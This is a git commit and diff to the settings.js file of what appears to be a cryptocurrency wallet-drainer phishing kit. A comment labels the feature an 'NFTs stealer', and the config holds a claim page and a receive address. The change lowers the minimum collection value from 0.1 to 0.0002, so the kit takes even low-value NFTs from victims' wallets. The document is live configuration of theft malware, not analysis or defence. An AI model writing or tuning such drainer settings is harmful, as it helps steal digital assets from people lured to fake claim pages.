5ff555cbb511f818b0596b76520c17dea35d809e
bondcollector <115157142+bondcollector@users.noreply.github.com>
2022-10-30 22:34:14 +1100

    Update settings.js

--- settings.js
+++ settings.js
@@ -34,7 +34,7 @@ const claimPageInfo = {
 
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.0002,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
 }
 
